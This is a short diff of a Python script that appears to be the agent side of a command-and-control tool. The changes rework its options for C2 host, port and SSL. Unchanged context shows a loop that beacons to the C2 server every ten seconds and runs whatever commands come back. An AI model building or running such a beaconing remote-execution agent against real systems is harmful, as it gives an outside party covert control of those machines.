@@ -13,9 +13,8 @@ def parse_args():
     parser.add_argument('--c2-host', action='store', dest='host', help='Change the c2 node hostname')
     parser.add_argument('--c2-port', action='store', dest='port',
                         help='Set port for C2 server')
-    parser.add_argument('--docker-registry-port', action='store', dest='d_port', help='Change the Docker Registry port'),
-    parser.add_argument('--docker-registry-host', action='store', dest='d_host', help='Change the Docker Registry host'),
-    parser.add_argument('--ssl', action='store', type=bool, dest='ssl', help="Enable or Disable C2 over SSL")
+    parser.add_argument('--ssl', action='store_true', dest='ssl', help='Turn SSL usage on'),
+    parser.add_argument('--no-ssl', action='store_false', dest='ssl', help="Turn SSL usage off")
     args = parser.parse_args()
     return args
 
@@ -25,11 +24,7 @@ def update_config(db, args):
         db.set_config('c2_host', args.host)
     if args.port:
         db.set_config('c2_port', args.port)
-    if args.d_host:
-        db.set_config('d_host', args.d_host)
-    if args.d_port:
-        db.set_config('d_port', args.d_port)
-    if args.ssl:
+    if args.ssl is not None:
         db.set_config('ssl', args.ssl)
 
 
@@ -64,7 +59,6 @@ def api_loop():
         commands = rest.beacon()
         map(lambda cmd: exec_cmd(cmd['cmd'], cmd['id']), commands)
         sleep(10)
-
 
 if __name__ == "__main__":
     main()
